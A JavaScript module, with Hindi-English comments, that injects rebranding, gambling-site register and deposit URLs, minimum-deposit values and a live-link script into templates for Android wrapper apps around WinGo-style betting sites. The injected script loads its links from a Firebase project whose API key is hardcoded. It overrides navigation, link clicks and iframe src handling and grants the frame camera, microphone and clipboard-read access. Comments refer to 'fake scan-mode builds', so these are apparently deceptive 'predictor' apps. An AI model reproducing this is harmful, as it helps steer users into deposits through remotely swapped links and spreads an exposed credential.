const fs = require('fs');
const { injectRouteCompat } = require('./routecompat');

/**
 * Extract domain from register URL
 * e.g. https://www.ts777.co/#/register?invitationCode=123  → ts777.co
 */
function extractDomain(registerUrl) {
  try {
    const u = new URL(registerUrl);
    return u.hostname.replace(/^www\./, '');
  } catch {
    return String(registerUrl).split('/')[2]?.replace(/^www\./, '') || '';
  }
}

/**
 * Detect if a register/game URL follows Dhani Win style (no hash, query params, etc.)
 * e.g. https://dhaniwin.cc/register?inviteCode=RZG9RNN&from=web
 */
function isDhaniUrl(url) {
  if (!url) return false;
  const u = String(url).trim().toLowerCase();
  if (u.includes('dhani')) return true;
  // If URL has no hash route (#/) and has invite/register/wallet/wingo keywords
  if (!u.includes('#/')) {
    // DhaniWin / 13l family hosts path-route karte hain (koi '#/' nahi).
    // Sirf host dekh kar bhi decide karna padta hai, warna "https://13l.co"
    // jaisa bare link hash-routed maan liya jata aur deposit/wingo URL galat
    // (…/#/wallet/Recharge) ban jata — page 404 / white screen.
    let host = '';
    try {
      host = new URL(u).hostname.replace(/^www\./, '');
    } catch {
      host = (u.split('/')[2] || '').replace(/^www\./, '');
    }
    if (/(^|[^a-z0-9])13l([^a-z0-9]|$)/.test(host)) return true;
    if (u.includes('invitecode') || u.includes('invite_code') || u.includes('/register') || u.includes('/wallet') || u.includes('/wingo')) {
      return true;
    }
  }
  return false;
}

/**
 * Build deposit/wingo URLs from register URL by replacing the hash path
 * Auto-detects Dhani Win URLs if isDhani is omitted or false.
 */
function buildUrls(registerUrl, isDhani = false) {
  let base;
  try {
    base = new URL(registerUrl).origin;
  } catch {
    base = String(registerUrl).split('#')[0].replace(/\/+$/, '');
  }
  const dhani = Boolean(isDhani || isDhaniUrl(registerUrl));
  if (dhani) {
    return {
      deposit: base + '/wallet/recharge',
      wingo: base + '/WinGo/WinGo_30S'
    };
  }
  return {
    deposit: base + '/#/wallet/Recharge',
    wingo: base + '/#/saasLottery/WinGo?gameCode=WinGo_30S&lottery=WinGo'
  };
}

/**
 * Inject all user params into HTML template
 * Handles both normal (zayro/wings) and dhani type HTMLs
 */
function injectParams(htmlContent, params) {
  const {
    registerUrl,
    depositUrl,
    wingoUrl,
    domain,
    firebasePath,
    minDeposit,
    brandTitle,
    appIconBase64,
    isDhani
  } = params;

  let html = htmlContent;

  // ── UNIVERSAL ROUTE COMPAT (DhaniWin / 13l) ──
  // Sabse pehle inject hota hai (head ki shuruaat me) taaki design ke apne
  // scripts chalne se pehle window.setUrl interception install ho jaye.
  // Isse har design — purana ya naya upload — path-routed games pe bhi
  // register / login / wingo sahi detect karta hai. Hash-routed games pe no-op.
  html = injectRouteCompat(html);

  // ── NORMALIZE GAME FRAME ──
  // Most uploaded designs already contain target-game-frame. A few (notably
  // Golden variants) navigate through a native bridge that is not available in
  // every Android template. Inject the same iframe contract automatically so
  // all designs use one reliable navigation/state pipeline.
  // PEHLE sirf 'target-game-frame' / 'gameIframe' ids match hote the. Naye
  // designs (jaise V30/V35) apna iframe 'gameFrame' id se rakhte hain — us case
  // me ek DOOSRA khali iframe inject ho jata tha aur payment-gateway handler
  // us khali iframe pe lag jata tha (DhaniWin / 13l deposit white screen).
  // Ab: design ke paas koi bhi iframe ho to wahi game frame hai, dobara inject
  // nahi karte; uska id injected scripts ko bata dete hain.
  const existingFrame = html.match(/<iframe\b[^>]*>/i);
  const existingFrameId = (html.match(/<iframe\b[^>]*\bid=["']([^"']+)["']/i) || [])[1] || '';
  const hadGameFrame = !!existingFrame;
  if (!hadGameFrame) {
    const frameCss = '<style id="zayro-auto-frame-style">#target-game-frame{position:fixed;inset:0;width:100%;height:100%;border:0;background:#000;z-index:0}</style>';
    const frameHtml = '<iframe id="target-game-frame" src="about:blank" allow="autoplay" title="Game"></iframe>';
    if (/<\/head>/i.test(html)) html = html.replace(/<\/head>/i, `${frameCss}</head>`);
    else html = frameCss + html;
    if (/<body\b[^>]*>/i.test(html)) html = html.replace(/<body\b[^>]*>/i, match => match + frameHtml);
    else html = frameHtml + html;
  }

  // ── REGISTER URL ──
  // Matches: REGISTER_URL="...", href="...", gameFrame.src="..."
  html = html.replace(
    /(var\s+REGISTER_URL\s*=\s*["'])([^"']+)(["'])/g,
    `$1${registerUrl}$3`
  );
  html = html.replace(
    /((?:gameFrame|gameIframe)\.src\s*=\s*["'])https?:\/\/[^"']+(["'])/g,
    `$1${registerUrl}$2`
  );
  html = html.replace(
    /(<iframe\b[^>]*\bid=["'](?:target-game-frame|gameIframe)["'][^>]*\bsrc=["'])[^"']+(["'])/gi,
    `$1${registerUrl}$2`
  );

  // ── DEPOSIT URL ──
  html = html.replace(
    /(var\s+DEPOSIT_URL\s*=\s*["'])([^"']+)(["'])/g,
    `$1${depositUrl}$3`
  );

  // ── WINGO URL ──
  html = html.replace(
    /(var\s+WINGO_URL\s*=\s*["'])([^"']+)(["'])/g,
    `$1${wingoUrl}$3`
  );

  // ── UNIVERSAL ROUTE NORMALIZATION (Future Designs Auto-Compat) ──
  // If an uploaded template only checks hash-based routes, upgrade it automatically
  // so it seamlessly supports non-hash games like DhaniWin without manual code changes.
  html = html.replace(
    /isOnRegisterPage\s*=\s*hash\.indexOf\(['"]\/register['"]\)\s*>=\s*0\s*\|\|\s*hash\.indexOf\(['"]invitationcode['"]\)\s*>=\s*0\s*\|\|\s*hash\.indexOf\(['"]invitecode['"]\)\s*>=\s*0(?!\s*\|\|\s*u\.indexOf);?/g,
    "isOnRegisterPage=hash.indexOf('/register')>=0||hash.indexOf('invitationcode')>=0||hash.indexOf('invitecode')>=0||u.indexOf('/register')>=0||u.indexOf('invitecode')>=0||u.indexOf('invitationcode')>=0;"
  );
  html = html.replace(
    /var\s+isReg\s*=\s*hash\.indexOf\(['"]\/register['"]\)\s*>=\s*0\s*\|\|\s*hash\.indexOf\(['"]invitationcode['"]\)\s*>=\s*0\s*\|\|\s*hash\.indexOf\(['"]invitecode['"]\)\s*>=\s*0(?!\s*\|\|\s*u\.indexOf);?/g,
    "var isReg=hash.indexOf('/register')>=0||hash.indexOf('invitationcode')>=0||hash.indexOf('invitecode')>=0||u.indexOf('/register')>=0||u.indexOf('invitecode')>=0||u.indexOf('invitationcode')>=0;"
  );
  html = html.replace(
    /var\s+isLogin\s*=\s*hash\.indexOf\(['"]\/login['"]\)\s*>=\s*0(?!\s*\|\|\s*u\.indexOf);?/g,
    "var isLogin=(hash.indexOf('/login')>=0||u.indexOf('/login')>=0) && !isOnRegisterPage;"
  );
  html = html.replace(
    /var\s+isWingo\s*=\s*hash\.indexOf\(['"]\/saaslottery['"]\)\s*>=\s*0\s*\|\|\s*hash\.indexOf\(['"]wingo['"]\)\s*>=\s*0\s*\|\|\s*hash\.indexOf\(['"]lottery['"]\)\s*>=\s*0(?!\s*\|\|\s*u\.indexOf);?/g,
    "var isWingo=hash.indexOf('/saaslottery')>=0||hash.indexOf('wingo')>=0||hash.indexOf('lottery')>=0||u.indexOf('/wingo')>=0||u.indexOf('wingo')>=0||u.indexOf('lottery')>=0;"
  );

  // ── FIREBASE DB PATH (e.g. "zayroliveharsh", "zayrowingsbittu") ──
  // Extract current path prefix from HTML first
  const pathMatch = html.match(/rtdb\.ref\(["']([a-zA-Z0-9_]+)\/(config|users)/);
  const oldPrefix = pathMatch ? pathMatch[1] : null;

  if (oldPrefix && oldPrefix !== firebasePath) {
    // Replace only in rtdb.ref("oldPrefix/...") contexts
    // Match: rtdb.ref("oldPrefix/config") and rtdb.ref("oldPrefix/users/...)
    const escapeRegex = (str) => str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const escapedOld = escapeRegex(oldPrefix);

    // Pattern: rtdb.ref("oldPrefix/
    html = html.replace(
      new RegExp(`(rtdb\\.ref\\(["'])${escapedOld}(\\/(?:config|users))`, 'g'),
      `$1${firebasePath}$2`
    );
  }

  // ── MIN DEPOSIT ──
  // Kuch templates me fbMinDeposit/minDeposit COMMA-separated var list me
  // hota hai ('var rtdb=null, fbDepositCondition=true, fbMinDeposit=500;')
  // — pehle ka regex sirf 'var fbMinDeposit=500' dhundta tha, isliye ye
  // kabhi replace nahi hote the. Ab \b se dono forms milte hain.
  html = html.replace(
    /(\b(?:fbMinDeposit|minDeposit)\s*=\s*)(\d+)/g,
    (m, g1) => g1 + minDeposit
  );
  // rechargeAmt span default content
  html = html.replace(
    /(<span\s+id=["']rechargeAmt["'][^>]*>)[^<]*/g,
    `$1&#8377;${minDeposit}`
  );

  // ── BRAND TITLE (popup card header / warning popup / <title>) ──
  // Kuch templates ke title ke andar nested elements hote hain (<span>,
  // &nbsp; etc.) — isliye PURA inner content replace karte hain (lazy
  // match closing </div> tak), sirf opening tag ke baad wala text nahi.
  // NOTE: 'card-title' pattern me lookahead (?=[\s"']) hai taaki
  // card-title-block / card-title-line1 (alag meaning) match na ho.
  const brandAttrPatterns = [
    /class=["'][^"']*brand-name[^"']*["']/,
    /class=["'][^"']*card-title-line1[^"']*["']/,
    /class=["'][^"']*card-title(?=[\s"'])[^"']*["']/,
    /id=["']mainBrandText["']/,
    /class=["'][^"']*wo-title[^"']*["']/,
    /id=["']woTitle["']/
  ];
  for (const attr of brandAttrPatterns) {
    html = html.replace(
      new RegExp(`(<div[^>]+(?:${attr.source})[^>]*>)[\\s\\S]*?<\\/div>`, 'g'),
      (m, g1) => g1 + brandTitle + '</div>'
    );
  }
  // wo-head-title / card-brand headers me sirf MAIN line (cb-main) change
  // karo — subtitle (cb-sub) design ke hisaab se waisa hi rehta hai.
  html = html.replace(
    /(<(?:span|div)[^>]*class=["'][^"']*cb-main[^"']*["'][^>]*>)([\s\S]*?)(<\/(?:span|div)>)/g,
    (m, g1, g2, g3) => g1 + brandTitle + g3
  );
  // Plain-text wo-head-title (jisme cb-main NAHI hai) — full inner replace.
  // cb-main wale pehle se handle ho chuke hain, unhe skip karte hain
  // (negative lookahead) taaki duplicate text na bane.
  html = html.replace(
    /(<div[^>]+class=["'][^"']*wo-head-title[^"']*["'][^>]*>)(?![^<]*<[^>]*cb-main)([\s\S]*?)<\/div>/g,
    (m, g1, g2) => g1 + brandTitle + '</div>'
  );
  // ══ RED-CORE/DHANI TEMPLATE FIX ══
  // Ye templates runtime pe JS se brand set karte hain:
  //   s.textContent = s.getAttribute('data-brand-text') || window.BRAND_NAME;
  // Agar data-brand-text / BRAND_NAME purana naam rakhte hain to inject
  // hua naya naam JS overwrite kar deta hai — isi se "popup card me name
  // nahi badla, warning popup me badal gaya" hota tha. Dono ko badlo.
  html = html.replace(
    /(data-brand-text=["'])[^"']*(["'])/g,
    (m, g1, g2) => g1 + brandTitle + g2
  );
  html = html.replace(
    /(window\.BRAND_NAME\s*=\s*window\.BRAND_NAME\s*\|\|\s*["'])[^"']*(["'])/g,
    (m, g1, g2) => g1 + brandTitle + g2
  );
  // Backup: simple-text wale divs (agar upar wala match na hua ho)
  const brandSimple = [
    /(<div[^>]+class=["'][^"']*brand-name[^"']*["'][^>]*>)[^<]*/g,
    /(<div[^>]+class=["'][^"']*card-title-line1[^"']*["'][^>]*>)[^<]*/g,
    /(<div[^>]+class=["'][^"']*wo-title["'][^>]*>)[^<]*/g
  ];
  brandSimple.forEach(rx => {
    html = html.replace(rx, (m, g1) => g1 + brandTitle);
  });
  html = html.replace(/(<title>)[^<]*/g, (m, g1) => g1 + brandTitle);

  // ── APP ICON (my_icon.png → base64 data URI embedded) ──
  if (appIconBase64) {
    // Replace src="my_icon.png" in both miniBtn img and anywhere
    html = html.replace(
      /src=["']my_icon\.png["']/g,
      `src="data:image/png;base64,${appIconBase64}"`
    );
  }

  // ── FIREBASE PLACEHOLDER FIX ──
  // Several uploaded designs contain Sketchware's unresolved secret marker.
  // Without a real web API key their original condition listener never starts,
  // so panel states/minimum-deposit changes cannot arrive from Firebase.
  html = html.replace(
    /@secret:GOOGLE_API_KEY/g,
    'AIzaSyDja5Gx4v4sMbx4BM2_od9_bLkdxdEY4do'
  );

  // ── FIREBASE LIVE LINKS ──
  // ZAYRO-NO-ROUTE-COMPAT wale designs (fake scan-mode builds) me liveLinks
  // script inject NAHI karte — wo startup pe setUrl(REGISTER_URL) push karta
  // hai jo scan-mode design ko wapas register state me le jata.
  if (html.indexOf('ZAYRO-NO-ROUTE-COMPAT') >= 0) return html;

  // URLs are intentionally NOT stored in the APK or localStorage. The app
  // waits for <firebasePath>/config and always uses those Firebase values.
  let firebaseSdkScripts = '';
  if (!/firebase-app-compat\.js/i.test(html)) {
    firebaseSdkScripts += '<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>';
  }
  if (!/firebase-database-compat\.js/i.test(html)) {
    firebaseSdkScripts += '<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>';
  }
  const liveLinksScript = `${firebaseSdkScripts}<script>
(function(){
  function zayroGameFrame(){
    try{
      if(window.gameFrame&&window.gameFrame.tagName==='IFRAME')return window.gameFrame;
      var ids=[window.__zayroFrameId,'target-game-frame','gameIframe','gameFrame'];
      for(var i=0;i<ids.length;i++){
        if(!ids[i])continue;
        var el=document.getElementById(ids[i]);
        if(el)return el;
      }
      return document.querySelector('iframe');
    }catch(e){return null;}
  }
  var livePath=${JSON.stringify(firebasePath)};
  var autoFrameInjected=${hadGameFrame ? 'false' : 'true'};
  window.__zayroFrameId=${JSON.stringify(existingFrameId)};
  var gameFrame=zayroGameFrame();
  if(gameFrame)window.gameFrame=gameFrame;
  var firebaseConfig={
    apiKey:'AIzaSyDja5Gx4v4sMbx4BM2_od9_bLkdxdEY4do',
    authDomain:'zayrodev-195f3.firebaseapp.com',
    projectId:'zayrodev-195f3',
    storageBucket:'zayrodev-195f3.firebasestorage.app',
    messagingSenderId:'357941061158',
    appId:'1:357941061158:web:12882185e2fa7f4f5328e7',
    databaseURL:'https://zayrodev-195f3-default-rtdb.firebaseio.com'
  };
  function valid(u){return typeof u==='string' && /^https?:\\/\\//i.test(u);}
  var firstFirebaseLinkLoad=true;
  function applyLinks(data){
    if(!data||typeof data!=='object')return;
    var previousRegister=REGISTER_URL;
    var nextRegister=data.registerUrl||data.register_url;
    var nextDeposit=data.depositUrl||data.deposit_url;
    var nextWingo=data.wingoUrl||data.wingo_url;
    if(!valid(nextRegister)||!valid(nextDeposit)||!valid(nextWingo))return;
    REGISTER_URL=nextRegister;
    DEPOSIT_URL=nextDeposit;
    WINGO_URL=nextWingo;
    if(typeof gameFrame!=='undefined'&&gameFrame){
      try{
        var current=gameFrame.src||'';
        if(firstFirebaseLinkLoad||!current||current==='about:blank'||current===previousRegister){
          gameFrame.src=REGISTER_URL;
        }
      }catch(e){}
    }
    if(firstFirebaseLinkLoad&&typeof window.setUrl==='function'){
      try{window.setUrl(REGISTER_URL);}catch(e){}
    }
    firstFirebaseLinkLoad=false;
  }
  if(autoFrameInjected&&gameFrame){
    window.navTo=function(url){
      if(!valid(url))return;
      gameFrame.src=url;
      if(typeof window.setUrl==='function')try{window.setUrl(url);}catch(e){}
      if(typeof window.reportArea==='function')try{window.reportArea();}catch(e){}
    };
  }
  window.__zayroAuthRoute=false;
  if(typeof window.setUrl==='function'&&!window.setUrl.__zayroWrapped){
    var originalSetUrl=window.setUrl;
    var wrappedSetUrl=function(url){
      var lower=(url||'').toString().toLowerCase();
      window.__zayroAuthRoute=lower.indexOf('/register')>=0||lower.indexOf('invitationcode')>=0||lower.indexOf('invitecode')>=0||lower.indexOf('/login')>=0;
      var result=originalSetUrl.apply(this,arguments);
      if(window.__zayroAuthRoute&&typeof window.setState==='function'){
        try{window.setState('wait');}catch(e){}
      } else if((lower.indexOf('/wingo')>=0||lower.indexOf('wingo')>=0||lower.indexOf('lottery')>=0||lower.indexOf('saaslottery')>=0)&&!window.__zayroAuthRoute){
        if(typeof window.setState==='function'){
          try{window.setState('wingo');}catch(e){}
        }
      }
      return result;
    };
    wrappedSetUrl.__zayroWrapped=true;
    window.setUrl=wrappedSetUrl;
  }
  if(typeof window.setBalance==='function'&&!window.setBalance.__zayroWrapped){
    var originalSetBalance=window.setBalance;
    var wrappedSetBalance=function(balance){
      if(window.__zayroAuthRoute){
        if(typeof window.setState==='function')try{window.setState('wait');}catch(e){}
        return;
      }
      return originalSetBalance.apply(this,arguments);
    };
    wrappedSetBalance.__zayroWrapped=true;
    window.setBalance=wrappedSetBalance;
  }
  if(gameFrame&&!gameFrame.__zayroLoadReporter){
    gameFrame.__zayroLoadReporter=true;
    gameFrame.addEventListener('load',function(){
      try{if(typeof window.setUrl==='function')window.setUrl(gameFrame.src||'');}catch(e){}
    });
  }
  var attempts=0,connected=false;
  function connect(){
    if(connected)return;
    try{
      if((typeof rtdb==='undefined'||!rtdb)&&typeof firebase!=='undefined'){
        var app=firebase.apps&&firebase.apps.length?firebase.app():firebase.initializeApp(firebaseConfig);
        rtdb=app.database?app.database():firebase.database();
      }
      if(typeof rtdb!=='undefined'&&rtdb&&typeof rtdb.ref==='function'){
        connected=true;
        rtdb.ref(livePath+'/config').on('value',function(snap){
          if(snap&&snap.exists())applyLinks(snap.val());
        });
        return;
      }
    }catch(e){}
    if(++attempts<120)setTimeout(connect,250);
  }
  connect();
  if(gameFrame && REGISTER_URL && valid(REGISTER_URL)){
    var current=gameFrame.src||'';
    if(!current || current==='about:blank' || current.endsWith('about:blank') || current.startsWith('file:///')){
      gameFrame.src = REGISTER_URL;
      if(typeof window.setUrl==='function') try{window.setUrl(REGISTER_URL);}catch(e){}
    }
  }
  setTimeout(function(){
    if(gameFrame && REGISTER_URL && valid(REGISTER_URL)){
      var current=gameFrame.src||'';
      if(!current || current==='about:blank' || current.endsWith('about:blank') || current.startsWith('file:///')){
        gameFrame.src = REGISTER_URL;
        if(typeof window.setUrl==='function') try{window.setUrl(REGISTER_URL);}catch(e){}
      }
    }
  }, 150);
})();
</script><script>
// ── ZAYRO UNIVERSAL IN-APP URL HANDLER - FIX FOR DHANIWIN / 13L DEPOSIT WHITE SCREEN ──
// Ensures all external URLs (deposit, payment gateways, etc.) open inside APK, never white screen
(function(){
  if(window.__zayroUrlFixApplied) return;
  window.__zayroUrlFixApplied = true;
  function isPaymentGatewayUrl(u){
    if(!u) return false;
    var s = String(u).toLowerCase();
    if(s==='about:blank' || s.startsWith('file://')) return false;
    // Wallet/recharge pages themselves are OK in iframe, but their child pay pages are NOT
    var isWalletPage = (s.includes('/wallet') || s.includes('recharge')) && !s.includes('/pay') && !s.includes('checkout') && !s.includes('qr') && !s.includes('upi');
    if(isWalletPage) return false;
    var payKeys = ['/pay','checkout','/qr','upi','razorpay','cashfree','payu','ccavenue','arpay','usdt','ewallet','phonepe','paytm','gpay','gateway','/payment','/order','/initiate','/processing','/cashier','/deposit/pay','/recharge/pay'];
    for(var i=0;i<payKeys.length;i++){ if(s.indexOf(payKeys[i])>=0) return true; }
    return false;
  }
  function openInApp(url){
    if(!url) return false;
    var u = String(url).trim();
    if(!u) return false;
    try{
      if(window.ZAYRO && typeof window.ZAYRO.openExternal === 'function'){
        window.ZAYRO.openExternal(u);
        return true;
      }
    }catch(e){}
    try{
      if(window.ZAYRO && typeof window.ZAYRO.openUrl === 'function' && !isPaymentGatewayUrl(u)){
        window.ZAYRO.openUrl(u);
        return true;
      }
    }catch(e){}
    try{
      var gf = (window.gameFrame && window.gameFrame.tagName==='IFRAME') ? window.gameFrame
             : (document.getElementById(window.__zayroFrameId||'') || document.getElementById('target-game-frame')
                || document.getElementById('gameIframe') || document.getElementById('gameFrame')
                || document.querySelector('iframe'));
      if(gf && !isPaymentGatewayUrl(u)){
        gf.src = u;
        if(typeof window.setUrl === 'function'){ try{ window.setUrl(u); }catch(e){} }
        return true;
      } else if(gf && isPaymentGatewayUrl(u)){
        // Payment gateway must open in popup overlay, not iframe (prevents white screen due to X-Frame-Options)
        if(window.ZAYRO && window.ZAYRO.openExternal){ window.ZAYRO.openExternal(u); return true; }
      }
    }catch(e){}
    return false;
  }
  // Override window.open to keep everything inside app
  try{
    var _origOpen = window.open;
    window.open = function(url, name, specs){
      if(url){
        if(openInApp(url)){
          return { closed:false, focus:function(){}, close:function(){}, location:{href:url} };
        }
      }
      try{ return _origOpen.apply(this, arguments); }catch(e){ return null; }
    };
  }catch(e){}
  // Intercept clicks on _blank and external links (deposit, payment, etc.)
  document.addEventListener('click', function(e){
    var el = e.target;
    var depth = 0;
    while(el && depth < 6){
      if(el.tagName === 'A' && el.href){
        var href = el.href;
        var target = (el.getAttribute('target')||'').toLowerCase();
        var lowerHref = href.toLowerCase();
        var isExternal = lowerHref.indexOf('http://')===0 || lowerHref.indexOf('https://')===0;
        var isDepositRelated = lowerHref.indexOf('wallet')>=0 || lowerHref.indexOf('recharge')>=0 || lowerHref.indexOf('deposit')>=0 || lowerHref.indexOf('pay')>=0 || lowerHref.indexOf('checkout')>=0 || lowerHref.indexOf('payment')>=0;
        if(isExternal && (target==='_blank' || isDepositRelated)){
          e.preventDefault();
          e.stopPropagation();
          openInApp(href);
          return;
        }
      }
      el = el.parentElement;
      depth++;
    }
  }, true);
  // Aggressively monitor iframe src - if it becomes payment gateway, open in popup and revert
  try{
    var gf = (window.gameFrame && window.gameFrame.tagName==='IFRAME') ? window.gameFrame
           : (document.getElementById(window.__zayroFrameId||'') || document.getElementById('target-game-frame')
              || document.getElementById('gameIframe') || document.getElementById('gameFrame')
              || document.querySelector('iframe'));
    if(gf){
      var needed = ['allow-forms','allow-modals','allow-orientation-lock','allow-pointer-lock','allow-popups','allow-popups-to-escape-sandbox','allow-presentation','allow-same-origin','allow-scripts','allow-top-navigation','allow-top-navigation-by-user-activation','allow-downloads'];
      var current = (gf.getAttribute('sandbox')||'').split(/\\s+/);
      needed.forEach(function(p){ if(current.indexOf(p)===-1) current.push(p); });
      gf.setAttribute('sandbox', current.join(' ').trim());
      gf.setAttribute('allow', 'autoplay; camera; microphone; clipboard-read; clipboard-write; geolocation; payment; fullscreen; screen-wake-lock; clipboard-write');
      // Proxy iframe src setter
      try{
        var origDesc = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype,'src');
        if(origDesc && origDesc.set){
          Object.defineProperty(gf,'src',{
            get: origDesc.get,
            set: function(v){
              try{
                if(isPaymentGatewayUrl(v)){
                  if(openInApp(v)) return;
                }
              }catch(e){}
              return origDesc.set.call(this,v);
            },
            configurable:true
          });
        }
      }catch(e){}
      // MutationObserver for src attribute
      try{
        var mo = new MutationObserver(function(muts){
          muts.forEach(function(m){
            if(m.attributeName==='src'){
              var newSrc = gf.getAttribute('src')||gf.src||'';
              if(isPaymentGatewayUrl(newSrc)){
                var last = window.__lastPayUrl||'';
                if(newSrc!==last){
                  window.__lastPayUrl=newSrc;
                  openInApp(newSrc);
                  // Revert iframe to deposit page to avoid white screen
                  setTimeout(function(){
                    try{
                      if(typeof DEPOSIT_URL!=='undefined' && DEPOSIT_URL) gf.src = DEPOSIT_URL;
                    }catch(e){}
                  }, 500);
                }
              }
            }
          });
        });
        mo.observe(gf,{attributes:true, attributeFilter:['src']});
      }catch(e){}
      // Polling fallback every 800ms
      setInterval(function(){
        try{
          var src = (gf.getAttribute('src')||gf.src||'').toString();
          if(isPaymentGatewayUrl(src)){
            var last = window.__lastPayUrl||'';
            if(src!==last){
              window.__lastPayUrl=src;
              openInApp(src);
            }
          }
        }catch(e){}
      }, 800);
    }
  }catch(e){}
  // Also override global navigate function if exists (used by panel buttons)
  try{
    if(typeof window.navigate === 'function' && !window.navigate.__zayroWrapped){
      var origNav = window.navigate;
      window.navigate = function(url){
        if(isPaymentGatewayUrl(url)){
          if(openInApp(url)) return;
        }
        return origNav.apply(this, arguments);
      };
      window.navigate.__zayroWrapped=true;
    }
  }catch(e){}
})();
</script>`;
  if (/<\/body>/i.test(html)) html = html.replace(/<\/body>/i, `${liveLinksScript}</body>`);
  else html += liveLinksScript;

  return html;
}

module.exports = { extractDomain, isDhaniUrl, buildUrls, injectParams };
